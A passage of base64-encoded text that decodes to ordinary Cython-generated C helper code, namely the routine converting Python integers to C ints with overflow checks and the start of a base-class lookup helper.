EdDQyBkaWFnbm9zdGljIHBvcFxuI2VuZGlmXG4gICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87XG4gICAgaWYgKHVubGlrZWx5KCFQeUxvbmdfQ2hlY2soeCkpKSB7XG4gICAgICAgIGludCB2YWw7XG4gICAgICAgIFB5T2JqZWN0ICp0bXAgPSBfX1B5eF9QeU51bWJlcl9Mb25nKHgpO1xuICAgICAgICBpZiAoIXRtcCkgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICB2YWwgPSBfX1B5eF9QeUxvbmdfQXNfaW50KHRtcCk7XG4gICAgICAgIFB5X0RFQ1JFRih0bXApO1xuICAgICAgICByZXR1cm4gdmFsO1xuICAgIH1cbiAgICBpZiAoaXNfdW5zaWduZWQpIHtcbiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5TG9uZ19Jc05lZyh4KSkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9IGVsc2UgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgX19QeXhfY29tcGFjdF91cHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkpXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyh4KTtcbiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpO1xuICAgICAgICAgICAgc3dpdGNoIChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSkge1xuICAgICAgICAgICAgICAgIGNhc2UgMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAxICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSA+PSAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpID49IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgPj0gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE3XG4gICAgICAgIGlmICh1bmxpa2VseShQeV9TSVpFKHgpIDwgMCkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9XG4jZWxzZVxuICAgICAgICB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHgsIFB5X0ZhbHNlLCBQeV9MVCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpXG4gICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSAxKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdztcbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgdW5zaWduZWQgbG9uZywgUHlMb25nX0FzVW5zaWduZWRMb25nKHgpKVxuI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgdW5zaWduZWQgUFlfTE9OR19MT05HLCBQeUxvbmdfQXNVbnNpZ25lZExvbmdMb25nKHgpKVxuI2VuZGlmXG4gICAgICAgIH1cbiAgICB9IGVsc2Uge1xuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAgICAgICBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBfX1B5eF9jb21wYWN0X3B5bG9uZywgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSlcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7XG4gICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KHgpKSB7XG4gICAgICAgICAgICAgICAgY2FzZSAtMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMSAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBsb25nLCAtKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKChpbnQpLTEpKigoKCgoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAxICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAtMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBsb25nLCAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKGludCktMSkqKCgoKCgoKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKCgoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAtNDpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBsb25nLCAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoaW50KS0xKSooKCgoKCgoKChpbnQpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKCgoKGludClkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNlbmRpZlxuICAgICAgICBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZihsb25nKSkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhpbnQsIGxvbmcsIFB5TG9uZ19Bc0xvbmcoeCkpXG4jaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKFBZX0xPTkdfTE9ORykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc0xvbmdMb25nKHgpKVxuI2VuZGlmXG4gICAgICAgIH1cbiAgICB9XG4gICAge1xuICAgICAgICBpbnQgdmFsO1xuICAgICAgICBpbnQgcmV0ID0gLTE7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNiAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBQeV9zc2l6ZV90IGJ5dGVzX2NvcGllZCA9IFB5TG9uZ19Bc05hdGl2ZUJ5dGVzKFxuICAgICAgICAgICAgeCwgJnZhbCwgc2l6ZW9mKHZhbCksIFB5X0FTTkFUSVZFQllURVNfTkFUSVZFX0VORElBTiB8IChpc191bnNpZ25lZCA/IFB5X0FTTkFUSVZFQllURVNfVU5TSUdORURfQlVGRkVSIHwgUHlfQVNOQVRJVkVCWVRFU19SRUpFQ1RfTkVHQVRJVkUgOiAwKSk7XG4gICAgICAgIGlmICh1bmxpa2VseShieXRlc19jb3BpZWQgPT0gLTEpKSB7XG4gICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHkoYnl0ZXNfY29waWVkID4gKFB5X3NzaXplX3QpIHNpemVvZih2YWwpKSkge1xuICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdztcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJldCA9IDA7XG4gICAgICAgIH1cbiNlbGlmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMCAmJiAhKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSB8fCBkZWZpbmVkKF9QeUxvbmdfQXNCeXRlQXJyYXkpXG4gICAgICAgIGludCBvbmUgPSAxOyBpbnQgaXNfbGl0dGxlID0gKGludCkqKHVuc2lnbmVkIGNoYXIgKikmb25lO1xuICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbDtcbiAgICAgICAgcmV0ID0gX1B5TG9uZ19Bc0J5dGVBcnJheSgoUHlMb25nT2JqZWN0ICopeCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5dGVzLCBzaXplb2YodmFsKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzX2xpdHRsZSwgIWlzX3Vuc2lnbmVkKTtcbiNlbHNlXG4gICAgICAgIFB5T2JqZWN0ICp2O1xuICAgICAgICBQeU9iamVjdCAqc3RlcHZhbCA9IE5VTEwsICptYXNrID0gTlVMTCwgKnNoaWZ0ID0gTlVMTDtcbiAgICAgICAgaW50IGJpdHMsIHJlbWFpbmluZ19iaXRzLCBpc19uZWdhdGl2ZSA9IDA7XG4gICAgICAgIGludCBjaHVua19zaXplID0gKHNpemVvZihsb25nKSA8IDgpID8gMzAgOiA2MjtcbiAgICAgICAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdCh4KSkpIHtcbiAgICAgICAgICAgIHYgPSBfX1B5eF9OZXdSZWYoeCk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICB2ID0gUHlOdW1iZXJfTG9uZyh4KTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdikpIHJldHVybiAoaW50KSAtMTtcbiAgICAgICAgICAgIGFzc2VydChQeUxvbmdfQ2hlY2tFeGFjdCh2KSk7XG4gICAgICAgIH1cbiAgICAgICAge1xuICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh2LCBQeV9GYWxzZSwgUHlfTFQpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA8IDApKSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKHYpO1xuICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAtMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlzX25lZ2F0aXZlID0gcmVzdWx0ID09IDE7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KGlzX25lZ2F0aXZlKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKHYpO1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSBpZiAoaXNfbmVnYXRpdmUpIHtcbiAgICAgICAgICAgIHN0ZXB2YWwgPSBQeU51bWJlcl9JbnZlcnQodik7XG4gICAgICAgICAgICBQeV9ERUNSRUYodik7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXN0ZXB2YWwpKVxuICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAtMTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHN0ZXB2YWwgPSB2O1xuICAgICAgICB9XG4gICAgICAgIHYgPSBOVUxMO1xuICAgICAgICB2YWwgPSAoaW50KSAwO1xuICAgICAgICBtYXNrID0gUHlMb25nX0Zyb21Mb25nKCgxTCA8PCBjaHVua19zaXplKSAtIDEpOyBpZiAodW5saWtlbHkoIW1hc2spKSBnb3RvIGRvbmU7XG4gICAgICAgIHNoaWZ0ID0gUHlMb25nX0Zyb21Mb25nKGNodW5rX3NpemUpOyBpZiAodW5saWtlbHkoIXNoaWZ0KSkgZ290byBkb25lO1xuICAgICAgICBmb3IgKGJpdHMgPSAwOyBiaXRzIDwgKGludCkgc2l6ZW9mKGludCkgKiA4IC0gY2h1bmtfc2l6ZTsgYml0cyArPSBjaHVua19zaXplKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqdG1wLCAqZGlnaXQ7XG4gICAgICAgICAgICBsb25nIGlkaWdpdDtcbiAgICAgICAgICAgIGRpZ2l0ID0gUHlOdW1iZXJfQW5kKHN0ZXB2YWwsIG1hc2spO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFkaWdpdCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoZGlnaXQpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGRpZ2l0KTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPCAwKSkgZ290byBkb25lO1xuICAgICAgICAgICAgdmFsIHw9ICgoaW50KSBpZGlnaXQpIDw8IGJpdHM7XG4gICAgICAgICAgICB0bXAgPSBQeU51bWJlcl9Sc2hpZnQoc3RlcHZhbCwgc2hpZnQpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF0bXApKSBnb3RvIGRvbmU7XG4gICAgICAgICAgICBQeV9ERUNSRUYoc3RlcHZhbCk7IHN0ZXB2YWwgPSB0bXA7XG4gICAgICAgIH1cbiAgICAgICAgUHlfREVDUkVGKHNoaWZ0KTsgc2hpZnQgPSBOVUxMO1xuICAgICAgICBQeV9ERUNSRUYobWFzayk7IG1hc2sgPSBOVUxMO1xuICAgICAgICB7XG4gICAgICAgICAgICBsb25nIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoc3RlcHZhbCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIHJlbWFpbmluZ19iaXRzID0gKChpbnQpIHNpemVvZihpbnQpICogOCkgLSBiaXRzIC0gKGlzX3Vuc2lnbmVkID8gMCA6IDEpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA+PSAoMUwgPDwgcmVtYWluaW5nX2JpdHMpKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICAgICAgdmFsIHw9ICgoaW50KSBpZGlnaXQpIDw8IGJpdHM7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCFpc191bnNpZ25lZCkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHZhbCAmICgoKGludCkgMSkgPDwgKHNpemVvZihpbnQpICogOCAtIDEpKSkpXG4gICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdztcbiAgICAgICAgICAgIGlmIChpc19uZWdhdGl2ZSlcbiAgICAgICAgICAgICAgICB2YWwgPSB+dmFsO1xuICAgICAgICB9XG4gICAgICAgIHJldCA9IDA7XG4gICAgZG9uZTpcbiAgICAgICAgUHlfWERFQ1JFRihzaGlmdCk7XG4gICAgICAgIFB5X1hERUNSRUYobWFzayk7XG4gICAgICAgIFB5X1hERUNSRUYoc3RlcHZhbCk7XG4jZW5kaWZcbiAgICAgICAgaWYgKHVubGlrZWx5KHJldCkpXG4gICAgICAgICAgICByZXR1cm4gKGludCkgLTE7XG4gICAgICAgIHJldHVybiB2YWw7XG4gICAgfVxucmFpc2Vfb3ZlcmZsb3c6XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsXG4gICAgICAgICJ2YWx1ZSB0b28gbGFyZ2UgdG8gY29udmVydCB0byBpbnQiKTtcbiAgICByZXR1cm4gKGludCkgLTE7XG5yYWlzZV9uZWdfb3ZlcmZsb3c6XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsXG4gICAgICAgICJjYW5cJ3QgY29udmVydCBuZWdhdGl2ZSB2YWx1ZSB0byBpbnQiKTtcbiAgICByZXR1cm4gKGludCkgLTE7XG59XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIGludCBfX1B5eF9JbkJhc2VzKFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKSB7XG4gICAgd2hpbGUgKGEpIHtcbiAgICAgICAgYSA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KGEsIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopO1xuICAgICAgICBpZiAoYSA9PSBiKVxuICAgICAgICAgICAgcmV0dXJuIDE7XG4gICAgfVxuICAgIHJldHVybiBiID09ICZQeUJhc2VPYmplY3RfVHlwZTtcbn1